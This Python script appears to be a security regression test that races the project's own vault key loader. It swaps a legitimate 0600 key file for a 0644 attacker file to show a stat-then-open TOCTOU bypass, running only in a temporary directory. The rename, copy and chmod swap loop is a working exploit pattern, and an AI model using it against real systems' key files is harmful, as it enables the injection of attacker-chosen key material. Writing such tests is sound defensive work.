#!/usr/bin/env python3
"""VAULT KEY-FILE PERMS GATE — TOCTOU RACE (owner order 2026-10-31, item 1.5).

RED class: load_key()/Vault.open() checked permissions by stat'ing the
PATH, then opened the PATH AGAIN by name — two independent resolutions.
A co-located writer (the classic low-privilege attacker: no read rights
on the 0600 key file, but WRITE rights on its directory) can race the
window: the stat sees the legit 0600 file, the open reads the ATTACKER's
0644 file — the gate never refuses, and attacker-chosen key material is
loaded through the "checked" path.

This driver is a REAL attack, not a simulation:
  * the victim process loops the REAL burhan.vault.load_key();
  * the attacker process hammers REAL rename/copy/chmod swaps concurrently;
  * nothing is mocked, patched, delayed, or window-widened.

Outcome verdict:
  BYPASS  (exit 2): >=1 load_key() returned the ATTACKER's key_id —
          material from a 0644 file the gate exists to refuse.
  NO BYPASS (exit 0): the gate held for the whole run (the blue shape).
"""
import json
import multiprocessing as mp
import os
import shutil
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from burhan.vault import KEY_FORMAT, keygen, load_key  # noqa: E402

RUN_SECONDS = 20


def _attacker_key_json(material: bytes) -> str:
    import base64
    import hashlib
    return json.dumps({
        "format": KEY_FORMAT,
        "key_id": hashlib.sha256(material).hexdigest()[:8],
        "label": "attacker",
        "created": "2026-10-31T00:00:00Z",
        "data": base64.b64encode(material).decode(),
    })


def victim(P: str, real_id: str, att_id: str, stop: mp.Value,
           bypass: mp.Value, ok_real: mp.Value, refused: mp.Value, errors: mp.Value) -> None:
    """Loop the REAL load_key; classify every outcome."""
    deadline = time.time() + RUN_SECONDS
    while not stop.value and time.time() < deadline:
        try:
            kid, _data = load_key(P)
            if kid == att_id:
                with bypass.get_lock():
                    bypass.value += 1
                with stop.get_lock():
                    stop.value = 1
                return
            elif kid == real_id:
                with ok_real.get_lock():
                    ok_real.value += 1
            else:
                with errors.get_lock():
                    errors.value += 1
        except Exception:
            with refused.get_lock():
                refused.value += 1


def attacker(P: str, P_real: str, P_src: str, stop: mp.Value) -> None:
    """Hammer the swap: legit file aside, attacker file (0644) in, back."""
    deadline = time.time() + RUN_SECONDS
    while not stop.value and time.time() < deadline:
        try:
            os.rename(P, P_real)          # legit 0600 file aside
        except OSError:
            pass
        try:
            shutil.copyfile(P_src, P)     # attacker material at the target path
            # intentional: the ATTACK must produce a world-readable file —
            # that is the exact bad state the perms gate exists to refuse
            # codeql[py/overly-permissive-file]
            os.chmod(P, 0o644)
        except OSError:
            pass
        try:
            os.remove(P)
            os.rename(P_real, P)          # restore the legit file
        except OSError:
            pass


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="vault-toctou-") as d:
        P = os.path.join(d, "vault.key")
        P_real = os.path.join(d, "vault.key.real")
        P_src = os.path.join(d, "attacker.key.src")
        real_payload = keygen(P)                     # legit 0600 key file
        real_id = real_payload["key_id"]
        material = b"\xba\xad" * 16                   # attacker-chosen 32 bytes
        with open(P_src, "w") as fh:
            fh.write(_attacker_key_json(material))
        import hashlib
        att_id = hashlib.sha256(material).hexdigest()[:8]

        stop = mp.Value("i", 0)
        bypass = mp.Value("i", 0)
        ok_real = mp.Value("i", 0)
        refused = mp.Value("i", 0)
        errors = mp.Value("i", 0)

        v = mp.Process(target=victim, args=(P, real_id, att_id, stop, bypass, ok_real, refused, errors))
        a = mp.Process(target=attacker, args=(P, P_real, P_src, stop))
        v.start()
        a.start()
        v.join()
        a.join(max(0, 0))
        a.join(5)
        if a.is_alive():
            a.terminate()
            a.join()

        print(json.dumps({
            "run_seconds": RUN_SECONDS,
            "loads_with_real_key": ok_real.value,
            "gate_refusals_or_errors": refused.value + errors.value,
            "BYPASSES_loads_of_attacker_material": bypass.value,
        }))
        if bypass.value > 0:
            print("RED: the perms gate was bypassed — attacker key material "
                  "(from a 0644 file) was loaded after the gate stat'ed the legit 0600 file")
            return 2
        print("NO BYPASS in this run (blue shape: the gate held for every load)")
        return 0


if __name__ == "__main__":
    sys.exit(main())
